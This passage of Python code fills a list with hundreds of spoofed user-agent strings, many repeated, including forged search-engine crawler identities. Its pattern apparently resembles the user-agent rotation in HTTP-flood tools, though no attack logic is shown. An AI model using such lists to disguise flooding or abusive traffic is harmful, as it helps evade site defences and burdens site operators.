                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
                                    	headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
                                    	headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
                                    	headers_useragents.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
                                    	headers_useragents.append('SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
                                    	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
                                    	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
